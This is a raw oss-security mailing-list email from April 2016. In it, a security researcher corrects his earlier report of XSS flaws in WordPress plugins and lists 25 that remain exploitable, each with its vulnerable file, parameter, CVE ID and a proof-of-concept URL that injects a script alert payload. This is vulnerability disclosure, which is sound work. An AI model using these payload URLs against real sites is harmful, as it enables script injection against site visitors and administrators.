X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7832" "Thursday" "14" "April" "2016" "13:07:58" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<51BCC5B5-7EC2-497C-992F-A3EBB8647DDF@me.com>" "132" "Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." nil nil nil "4" "2016041417:07:58" "[oss-security] 39 XSS vulnerabilities in 35 wordpress plugins." (number mark "U       larry0@me.co Apr 14  132/7832  " thread-indent "\"Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.\"\n") "<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>" ("<9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9795 invoked by uid 550); 14 Apr 2016 17:08:14 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9773 invoked from network); 14 Apr 2016 17:08:13 -0000
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-04-14_08:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1510270003 definitions=main-1604140240
Content-type: text/plain; charset=us-ascii
MIME-version: 1.0 (Mac OS X Mail 9.2 \(3112\))
From: "Larry W. Cashdollar" <larry0@me.com>
In-reply-to: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
Date: Thu, 14 Apr 2016 13:07:58 -0400
Content-transfer-encoding: quoted-printable
Message-id: <51BCC5B5-7EC2-497C-992F-A3EBB8647DDF@me.com>
References: <9B8DD62E-0E7E-4B57-B1D5-AA4E6073D5BD@me.com>
To: oss-security@lists.openwall.com
X-Mailer: Apple Mail (2.3112)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1460653680; bh=WpSUnPn6ymBYxYcTKLHFdCentXj3VNl7Ho2cM2JKCBg=;
	h=Content-type:MIME-version:Subject:From:Date:Message-id:To;
	b=jcbQCRl4uI6mO8pqiJXGOlkZ7Ps3Z72YLcJ4RQmxCiPkpwEnHOgUVF0kcQKWIabB9
 eS+d1KJnlFkqEwfbQs8JDWWgQ4TGgUIxRXuGKci/rtvuLFqdxFsIZBV+rCcmmrqwpM
 5gPD9VHgHxtKAcFcp98s9iBX9jN4OhHXOLszYo/+GasfrjCdB8lQ7AXBC3XT6DMnYz
 fxjK2nh/Z3qXSIjMWI+K6fp58dKLyfjOB1gLJ9+JSBe65Xql3Spqgv00Ia9inBBN06
 ciA32lmEuWI7RTW5BvT7MPU/HUB8izAov+DK0QU9QRck64fQ6dR/RGx1A03IOswGHE
 aTAB7+wFYoraw==
Subject: Re: [oss-security] 39 XSS vulnerabilities in 35 wordpress plugins.

Hi List,

This morning I realized a flaw in my testing methodology, I used php5-cgi o=
n the command line setting environment variables to pass the XSS payload
to the vulnerable php code.  What I failed to realize is that if the plugin=
 code was setting a content-header this would be missed when I used phantom=
JS to render
the html output and execute any JS I had injected.  The result is only 25 o=
f the plugins are exploitable.  The other 14 aren't XSSable because they se=
t the content header=20
to something the browser doesn't render.  Here is a list of the remaining p=
lugins.  I'm sorry for my mistake.

Plugin:https://wordpress.org/plugins/indexisto File:./indexisto/assets/js/i=
ndexisto-inject.php Parameter:indexisto_index CVEID:2016-77360 PoC:hxxp://[=
target]/wp-content/plugins/indexisto/assets/js/indexisto-inject.php?indexis=
to_index=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/whizz File:./whizz/plugins/delete-plug=
in.php Parameter:plugin CVEID:2016-77799 PoC:hxxp://[target]/wp-content/plu=
gins/whizz/plugins/delete-plugin.php?plugin=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/anti-plagiarism File:./anti-plagiarism=
/js.php Parameter:m CVEID:2016-77035 PoC:hxxp://[target]/wp-content/plugins=
/anti-plagiarism/js.php?m=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/s3-video File:./s3-video/views/video-m=
anagement/preview_video.php Parameter:media CVEID:2016-77600 PoC:hxxp://[ta=
rget]/wp-content/plugins/s3-video/views/video-management/preview_video.php?=
media=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/wpsolr-search-engine File:./wpsolr-sea=
rch-engine/classes/extensions/managed-solr-servers/templates/template-my-ac=
counts.php Parameter:page  tab CVEID:2016-77958 PoC:hxxp://[target]/wp-cont=
ent/plugins/wpsolr-search-engine/classes/extensions/managed-solr-servers/te=
mplates/template-my-accounts.php?page=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/page-layout-builder File:./page-layout=
-builder/includes/layout-settings.php Parameter:layout_settings_id CVEID:20=
16-77503 PoC:hxxp://[target]/wp-content/plugins/page-layout-builder/include=
s/layout-settings.php?layout_settings_id=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/date_sel=
ect.php Parameter:date-from date-to CVEID:2016-77217 PoC:hxxp://[target]/wp=
-content/plugins/e-search/tmpl/date_select.php?date-from=3D"><script>alert(=
1);</script><"
Plugin:https://wordpress.org/plugins/e-search File:./e-search/tmpl/title_az=
.php Parameter:title_az CVEID:2016-77217 PoC:hxxp://[target]/wp-content/plu=
gins/e-search/tmpl/title_az.php?title_az=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/tidio-gallery File:./tidio-gallery/pop=
up-insert-help.php Parameter:galleryId id  tidio-gallery CVEID:2016-77727 P=
oC:hxxp://[target]/wp-content/plugins/tidio-gallery/popup-insert-help.php?g=
alleryId=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/parsi-font File:./parsi-font/css.php P=
arameter:font size CVEID:2016-77506 PoC:hxxp://[target]/wp-content/plugins/=
parsi-font/css.php?size=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/defa-online-image-protector File:./def=
a-online-image-protector/redirect.php Parameter:r CVEID:2016-77193 PoC:hxxp=
://[target]/wp-content/plugins/defa-online-image-protector/redirect.php?r=
=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/new-year-firework File:./new-year-fire=
work/firework/index.php Parameter:music text url CVEID:2016-77475 PoC:hxxp:=
//[target]/wp-content/plugins/new-year-firework/firework/index.php?text=3D"=
><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/simpel-reserveren File:./simpel-reserv=
eren/edit.php Parameter:page CVEID:2016-77628 PoC:hxxp://[target]/wp-conten=
t/plugins/simpel-reserveren/edit.php?page=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/ajax-random-post File:./ajax-random-po=
st/js.php Parameter:count interval CVEID:2016-77022 PoC:hxxp://[target]/wp-=
content/plugins/ajax-random-post/js.php?interval=3D"><script>alert(1);</scr=
ipt><"
Plugin:https://wordpress.org/plugins/admin-font-editor File:./admin-font-ed=
itor/css.php Parameter:font size CVEID:2016-77009 PoC:hxxp://[target]/wp-co=
ntent/plugins/admin-font-editor/css.php?size=3D"><script>alert(1);</script>=
<"
Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/playlist.php =
Parameter:playlist CVEID:2016-77337 PoC:hxxp://[target]/wp-content/plugins/=
hdw-tube/playlist.php?playlist=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/hdw-tube File:./hdw-tube/mychannel.php=
 Parameter:channel CVEID:2016-77337 PoC:hxxp://[target]/wp-content/plugins/=
hdw-tube/mychannel.php?channel=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/hero-maps-pro File:./hero-maps-pro/vie=
ws/dashboard/index.php Parameter:p v CVEID:2016-77341 PoC:hxxp://[target]/w=
p-content/plugins/hero-maps-pro/views/dashboard/index.php?v=3D"><script>ale=
rt(1);</script><"
Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/=
inc/pages/edit_styles.php Parameter:gid CVEID:2016-77517 PoC:hxxp://[target=
]/wp-content/plugins/photoxhibit/common/inc/pages/edit_styles.php?gid=3D"><=
script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/photoxhibit File:./photoxhibit/common/=
inc/pages/build.php Parameter:gid CVEID:2016-77517 PoC:hxxp://[target]/wp-c=
ontent/plugins/photoxhibit/common/inc/pages/build.php?gid=3D"><script>alert=
(1);</script><"
Plugin:https://wordpress.org/plugins/pondol-formmail File:./pondol-formmail=
/pages/admin-mail-info.php Parameter:itemid CVEID:2016-77532 PoC:hxxp://[ta=
rget]/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid=
=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/heat-trackr File:./heat-trackr/heat-tr=
ackr_abtest_add.php Parameter:id N  WPSLT CVEID:2016-77339 PoC:hxxp://[targ=
et]/wp-content/plugins/heat-trackr/heat-trackr_abtest_add.php?id=3D"><scrip=
t>alert(1);</script><"
Plugin:https://wordpress.org/plugins/tidio-form File:./tidio-form/popup-ins=
ert-help.php Parameter:formId id  tidio-form CVEID:2016-77726 PoC:hxxp://[t=
arget]/wp-content/plugins/tidio-form/popup-insert-help.php?formId=3D"><scri=
pt>alert(1);</script><"
Plugin:https://wordpress.org/plugins/simplified-content File:./simplified-c=
ontent/ooawpframework/js/ajax/OOAAjax.js.php Parameter:ajaxURL CVEID:2016-7=
7642 PoC:hxxp://[target]/wp-content/plugins/simplified-content/ooawpframewo=
rk/js/ajax/OOAAjax.js.php?ajaxURL=3D"><script>alert(1);</script><"
Plugin:https://wordpress.org/plugins/infusionsoft File:./infusionsoft/Infus=
ionsoft/examples/leadscoring.php Parameter:ContactId CVEID:2016-77364 PoC:h=
xxp://[target]/wp-content/plugins/infusionsoft/Infusionsoft/examples/leadsc=
oring.php?ContactId=3D"><script>alert(1);</script><"

Advisories here: http://www.vapidlabs.com/wp/wp.php


Again my apologies,
Larry


> On Apr 12, 2016, at 8:48 AM, Larry W. Cashdollar <larry0@me.com> wrote:
>=20
> Hello List,
>=20
>=20
> This was a project I worked on as part of my research in Akamai's SIRT, I=
 initially found 1352 suspect XSS vulnerabilities but Wordpress escapes sup=
er globals GET/POST/REQUEST
> https://core.trac.wordpress.org/ticket/18322.  I didn't know this at the =
time, so now I have a database of vulnerabilities that are context dependen=
t and would need to be examined
> individually.  I managed to automate XSS testing against the database and=
 of 1352 39 successfully executed javascript.  These are those 39, I've man=
ually verified they're still vulnerable.
>=20
> They're available here http://www.vapidlabs.com/wp/wp.php

